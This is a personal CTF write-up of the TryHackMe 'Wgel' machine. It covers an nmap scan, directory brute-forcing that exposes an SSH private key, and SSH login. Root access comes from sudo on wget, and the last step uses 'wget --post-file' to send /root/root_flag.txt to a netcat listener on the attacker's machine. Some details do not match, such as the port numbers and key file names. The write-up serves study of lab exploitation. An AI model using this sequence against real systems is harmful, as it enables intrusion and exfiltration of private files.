# Information

- **CTF Name**:  Wgel CTF
- **CTF Level**: Easy
- **CTF Description**: Can you exfiltrate the root flag?
- **Date**: 16/09/2025
- **Platform**: TRYHACKME
- **Category**: Machine
# step 1: Scanning the target ip
nmap scan with srvice and version ,skip host discovery(no ping) : nmap -sV -Pn 10.10.65.37
![[Screenshot 2025-09-16 214444.png]]
                       nmap scan
as we see from above two ports are open.HTTP and SSH,open http indicates the existance of web page.it is apache2 ubuntu default page now look at the source page to gather some information
![[VirtualBox_hunter_16_09_2025_20_32_01.png]]
                       some part of apache2 source page
   
# Step 2 Directory Bruteforce
Dirb is directory bruteforce that use around 4,612 word to perform bruteforcing
![[Screenshot 2025-09-16 213809.png]]
                   Directory Bruetforce
key directory come accross while we perform bruteforceing.it is  http://10.10.49.7/.ssh/

![[Screenshot 2025-09-16 215741.png]]
I clicked on the id_rsa directory and it showed me a private ssh key. Which can be used to log into ssh without a password
![[Screenshot 2025-09-16 215804.png]]
I just copied it into a file and made sure to change it’s file permissions to 600, because it won’t work without certain permissions.

nano rsa   
chmod 600 id_rsa

- Exploit  
    Now we can log in through ssh

ssh -i rsa jessie@[ip]
    username found from website page source
    ![[Screenshot 2025-09-22 095448.png]]
    Now , we got low-level access so we can access user flag.
![[Screenshot 2025-09-22 100136.png]]
To find root flag we need escalate your privilege to the highest level.
## Privilege escalation

The first thing we should is to check the Sudo permissions, what we can run as root:
![[Screenshot 2025-09-22 102034.png]]
Okay, we now know that we can run wget as root, let’s search for it GFTO.
## Starting listener

Use netcat to start listener.
               nc -lvp 800
The above command is used to set up a netcat listener on port 3344. Netcat is a versatile networking utility, and this command specifies the following options:

- `**l**`: option tells netcat to listen for incoming connections.
- `**v**`: stands for "verbose" and makes netcat display more information about the connection.
- `**p 800**`: specifies the port number, in my case it’s port 800.
![[Screenshot 2025-09-23 083503.png]]
Now, Finally use wget command to get root flag through listner.

sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.8.180.91:800
  ![[VirtualBox_hunter_23_09_2025_09_43_14.png]]
  We got the root flag.
  ![[VirtualBox_hunter_23_09_2025_09_43_28 1.png]]
  
  